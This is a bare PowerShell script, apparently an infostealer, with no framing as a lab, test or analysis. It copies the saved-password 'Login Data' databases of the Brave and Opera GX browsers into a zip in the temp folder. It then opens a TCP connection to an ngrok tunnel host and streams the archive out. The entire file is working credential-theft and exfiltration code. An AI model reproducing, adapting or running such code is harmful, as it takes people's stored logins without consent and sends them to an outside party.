$roaming = $env:APPDATA
$local = $env:LOCALAPPDATA
$temp = $env:TEMP
$zip = "$temp\envio.zip"
$tempFile = "$temp\UwUoperad"
if (Test-Path $zip) { Remove-Item $zip -Force }
Copy-Item "$local\BraveSoftware\Brave-Browser\User Data\Default\Login Data" $tempFile -Force
Compress-Archive "$roaming\Opera Software\Opera GX Stable\Default\Login Data", $tempFile -DestinationPath $zip -Force
Remove-Item $tempFile -Force
$c = New-Object Net.Sockets.TCPClient("6.tcp.eu.ngrok.io", 16037)
$s = $c.GetStream()
$b = [IO.File]::ReadAllBytes($zip)
$s.Write($b,0,$b.Length)
$s.Flush()
$s.Close()
$c.Close()